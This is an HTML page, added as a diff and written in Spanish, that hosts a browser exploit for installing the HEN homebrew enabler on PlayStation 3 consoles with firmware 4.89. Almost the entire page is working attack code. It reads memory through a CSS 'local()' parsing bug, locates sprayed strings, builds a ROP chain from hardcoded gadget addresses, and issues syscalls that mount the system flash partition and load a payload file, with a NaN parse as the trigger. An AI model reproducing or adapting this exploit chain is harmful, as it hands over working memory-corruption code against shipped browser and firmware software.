@@ -1,0 +1,421 @@
+<title>Auto HEN 4.89</title>
+<link rel="stylesheet" href="style.css">
+<center>
+<h1><span style='color:blue'>Host alternativo para instalar HEN en HFW 4.89</span></h1>
+<hr>
+<h2><span style='color:black'>Esto instalará HEN de forma áutomatica en tu PS3</span></h2>
+<hr>
+<div id="result"></div>
+<div id="exploit"></div>
+<div id="trigger" style="display: none;"></div>
+<script>
+var sf_swap_addr=0x172D3A0,xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,offset_array=[],t_out=0,search_max_threshold,search_base,search_size,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=0x8FD8DCC0,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4b_addr=0x42C778,gadget_mod4c_addr=0x054AF0,gadget_mod9_addr=0x010B20,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget12_addr=0x0C864C,ua = navigator.userAgent,fwv = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple")),base_file="/dev_hdd0/theme/HEN.P3T",fail_msg_frag="<h2><span style='color:red'>Inicializacion fallo. Cierre el navegador y vuelva a intentarlo.</span></h2>",progress_msg_frag1="<h2>Inicializando... ",progress_msg_frag2='%</h2>',flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1',filesystem='CELL_FS_FAT',mount_path='/dev_blind',toc_addr=7296344,gadget1_addr=620036,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828;
+function store_word(store_offset,val,r29out,r30out,r31out)
+{
+	r29out=gtemp_addr;
+	r30out=gtemp_addr;
+	r31out=gtemp_addr;
+	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(store_offset-0xC74)+fill_by_16bytes(0x10,dbyte41)
+	+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function stack_frame_swap(new_stack_addr)
+{
+	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+hexdw2bin(new_stack_addr)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(gadget_mod9_addr);
+}
+function showMsg(str)
+{
+	document.getElementById('result').innerHTML=str;
+}
+function syscall_r3_p2p(sc,r3_ptr,r4,r5,r6,r7,r8,r9,r10,r31out)
+{
+	if(r31out===null){r31out=gtemp_addr;}
+	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
+	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3_ptr)
+	+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function syscall_r3r5_p2p(sc,r3_ptr,r4,r5_ptr,r6,r7,r8,r9,r10,r31out)
+{
+	if(r31out===null){r31out=gtemp_addr;}
+	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
+	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(r5_ptr-0x4)+hexdw2bin(gtemp_addr)+fill_by_8bytes(0x18,dbyte41)
+	+hexdw2bin(gadget_mod4c_addr)+fill_by_16bytes(0xB0,dbyte41)+hexdw2bin(r3_ptr)+fill_by_16bytes(0x10,dbyte41)
+	+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function hexh2bin(hex_val)
+{
+	return String.fromCharCode(hex_val);
+}
+function hexw2bin(hex_val)
+{
+	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
+}
+function hexdw2bin(hex_val)
+{
+	return hexw2bin(0) + hexw2bin(hex_val);
+}
+String.prototype.toHex16 = function()
+{
+	return ('0000' + this).substr(-4);
+};
+String.prototype.toAscii = function(hex_16)
+{
+    var ascii='';
+	var i=0;
+	while(i<this.length){if(hex_16===true){ascii += this.charCodeAt(i).toString(16).toHex16();} else {ascii += this.charCodeAt(i).toString(16);}i+=1;}
+	return ascii;
+};
+String.prototype.convert=function(ascii)
+{
+	if(this.length<1){return '';}
+	var asciistr='';var asciichr='';var i=0;var ret=[];
+	if(ascii===true){asciistr = this;}
+	else {asciistr = this.toAscii();}
+	while((asciistr.length%4)!==0){asciistr+='00';}
+	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
+    while(i<asciistr.length){
+		asciichr = asciistr.substr(i, 4);
+		ret.push(String.fromCharCode(parseInt(asciichr, 16)));
+		i+=4;
+    }
+    return ret.join('');
+};
+String.prototype.convertedSize = function(ascii)
+{
+	if(this.length<1){return 0;}
+	var asciistr='';
+	if(ascii===true){asciistr=this;}
+	else {asciistr = this.toAscii();}
+	while((asciistr.length%4)!==0){asciistr+='00';}
+	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
+	return asciistr.length/2;
+};
+String.prototype.replaceAt=function(index, ch)
+{
+	return this.substr(0,index)+ch+this.substr(index+ch.length);
+};
+String.prototype.repeat = function(num)
+{
+    return new Array(num+1).join(this);
+};
+Number.prototype.noExponents=function()
+{
+    var data= String(this).split(/[eE]/);
+    if(data.length===1) {return data[0];}
+    var  z= '', sign= this<0? '-':'',
+    str= data[0].replace('.', ''),
+    mag= Number(data[1])+ 1;
+    if(mag<0){
+        z= sign+'0.';
+        while(mag++){z+='0';}
+        return z+str.replace(/^\-/,'');
+    }
+    mag -= str.length;  
+    while(mag--) {z += '0';}
+    return str + z;
+};
+function fromIEEE754(bytes, ebits, fbits)
+{
+	var retNumber=0;
+	var bits=[];
+	var i;
+	var j;
+	var byte;
+	for (i=bytes.length;i;i-=1)
+	{
+		byte=bytes[i-1];
+		for(j=8;j;j-=1)
+		{
+			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
+		}
+	}
+	bits.reverse();
+	var str = bits.join('');
+	var bias = (1 << (ebits - 1)) - 1;
+	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
+	var e = parseInt(str.substring(1, 1 + ebits), 2);
+	var f = parseInt(str.substring(1 + ebits), 2);
+	if (e === (1 << ebits) - 1)
+	{
+		retNumber = f !== 0 ? NaN : s * Infinity;
+	}
+	else if (e > 0)
+	{
+		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
+	}
+	else if (f !== 0)
+	{
+		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
+	}
+	else
+	{
+		retNumber = s * 0;
+	}
+	return retNumber.noExponents();
+}
+function generateIEEE754(address, size)
+{
+	var hex = new Array
+	(
+		(address >> 24) & 0xFF,
+		(address >> 16) & 0xFF,
+		(address >> 8) & 0xFF,
+		(address) & 0xFF,
+		
+		(size >> 24) & 0xFF,
+		(size >> 16) & 0xFF,
+		(size >> 8) & 0xFF,
+		(size) & 0xFF
+	);
+	return fromIEEE754(hex, 11, 52);
+}
+function generateExploit(address, size)
+{
+	var n = (address<<32) | ((size>>1)-1);
+	return generateIEEE754(address, (n-address));
+}
+function readMemory(address, size)
+{
+	if(document.getElementById('exploit')){document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";}
+}
+function checkMemory(address, size, len)
+{
+	if(document.getElementById('exploit'))
+	{
+		readMemory(address, size);
+		return document.getElementById('exploit').style.src.substr(6,len);
+	}
+}
+function trigger(exploit_addr){
+	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
+	if (document.getElementById('trigger').innerHTML.indexOf("NaN") != -1){HFWmsg();}
+}
+function load_check()
+{
+	if(total_loops<max_loops)
+	{
+		showMsg(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
+		t_out=setTimeout(initROP,150,false);
+	}
+	else
+	{
+		total_loops=0;
+		showMsg(fail_msg_frag);
+		t_out=0;
+	}
+}
+function findJsVariableOffset(name,exploit_data,base,size)
+{
+	readMemory(base,size);
+	var dat=document.getElementById('exploit').style.src.substr(6,size);
+	var i=0;
+	var t;
+	var k;
+	var match;
+	var exploit_addr;
+	while(i<(dat.length*2))
+	{
+		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
+		{
+			match=0;
+			for (k=0;k<(exploit_data.length*2);k+=0x2)
+			{
+				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
+				match+=1;
+			}
+			if (match===exploit_data.length)
+			{
+				exploit_addr=base+i+4;
+				
+				for(t=0;t<offset_array.length;t+=1)
+				{
+					if(offset_array[t]===exploit_addr)
+					{
+						return -1;
+					}
+				}
+				offset_array.push(exploit_addr);
+				return exploit_addr;
+			}
+		}
+		i+=0x10;
+	}
+	var end_range=base+size;
+	return 0;
+}
+function stack_frame_hookup()
+{
+	return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41);
+}
+function stack_frame_exit()
+{
+	return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A");
+}
+function syscall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out)
+{
+	if(r31out===null){r31out=gtemp_addr;}
+	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(sc)+hexw2bin(r10)
+	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
+	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function fill_by_4bytes(nbytes,hex_val)
+{
+	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
+	while(iterator<nbytes/4){stemp+=tmp.repeat(2);iterator++;}
+	return stemp;
+}
+function fill_by_8bytes(nbytes,hex_val)
+{
+	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
+	while(iterator<nbytes/8){stemp+=tmp.repeat(4);iterator++;}
+	return stemp;
+}
+function fill_by_16bytes(nbytes,hex_val)
+{
+	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
+	while(iterator<nbytes/16){stemp+=tmp.repeat(8);iterator++;}
+	return stemp;
+}
+function initROP(init)
+{
+	try
+	{
+		if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
+		if(t_out!==0){clearTimeout(t_out);t_out=0;}
+		offset_array=[];
+		xtra_data_addr=0;
+		stack_frame_addr=0;
+		jump_2_addr=0;
+		jump_1_addr=0;
+		var base_file_addr=0,index_key_addr=0,search_max_threshold=70*0x100000,search_base=0x80100000,search_size=2*mbytes;
+		search_size_ext=0*mbytes;
+		search_base_off=0*mbytes;
+		total_loops++;
+
+		xtra_data="xxxx".convert()
+		+flash_partition.convert()
+		+base_file.convert()
+		+filesystem.convert()
+		+mount_path.convert()
+		+unescape("\uFD7E");
+
+		while(xtra_data_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
+			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
+			search_max_threshold-=search_size;
+		}
+
+		flash_partition_addr=xtra_data_addr+0x6;
+		base_file_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
+		fs_addr=base_file_addr+base_file.convertedSize();
+		mount_path_addr=fs_addr+filesystem.convertedSize();
+
+		stack_frame=stack_frame_hookup()
+		+syscall(0x345,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
+		+store_word(0x8a000004+sf_swap_addr,sp_exit)
+		+store_word(0x8a000014+sf_swap_addr,gadget_mod8_addr)
+		+syscall(0x321,base_file_addr,0x0,0x8e000000,0,0,0,0,0)
+		+syscall_r3r5_p2p(0x322,0x8e000000,0x8a000000,0x11000,0x8e000008,0,0,0,0,0,0)
+		+syscall(0x32E,base_file_addr,0,0,0,0,0,0,0)
+		+stack_frame_swap(0x8a000000+sf_swap_addr)
+		+stack_frame_exit();
+
+		while(stack_frame_addr===0)
+		{
+			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();return;}
+			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
+			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);
+			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();return;}
+			search_max_threshold-=search_size+search_size_ext;
+		}
+
+		jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
+		while(jump_2_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
+			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
+			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();return;}
+			search_max_threshold-=search_size;
+		}
+
+		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
+		while(jump_1_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
+			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
+			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();return;}
+			search_max_threshold-=search_size;
+		}
+
+		var sf=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);
+		var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);
+		var j2=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);
+		var j1=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);
+
+		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
+		{
+			if(t_out!==0){clearTimeout(t_out);}
+			showMsg('<h2>Descargando HEN...</h2>');
+			window.location.href = 'HEN.P3T';
+			setTimeout(listener,1500);
+		}
+		else
+		{
+			load_check();
+		}
+	}
+	catch(e)
+	{
+
+	}
+}
+function listener()
+{
+	var myListener = function ()
+	{
+		document.removeEventListener('mousemove', myListener, false);
+		showMsg('<h2>Instalando HEN, por favor espere al reinicio...</h2>');
+		triggerX();
+	};
+	document.addEventListener('mousemove', myListener, false);
+}
+function triggerX()
+{
+	setTimeout(trigger,50,jump_1_addr);
+	setTimeout(showMsg,2000,"<h2><span style='color:red'>Fallo al cargar el archivo HEN.P3T. Cierra el navegador y vuelve a intentarlo.</span></h2>");
+	t_out=0;
+	total_loops=0;
+}
+function HFWmsg()
+{
+	showMsg("<h2><span style='color:red'>Asegurate de tener instalado el Firmware (HFW) 4.89 en tu consola antes de usar esto!</h2></span>");
+	throw new Error('');
+}
+if(fwv=="4.89"){initROP(true)}else{HFWmsg()}
+</script>
+<img border="5px" width="250" height="250" src="thewizwiki.png"></img>
+<h4 style="text-align:center; color: black" >Creado por TheWizWiki</h4>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<hr>
+<h3><span style='color:black'>Credits: Oficial PS3Xploit.com || PSX-Place.com || All PS3 Cominunity</span></h3>
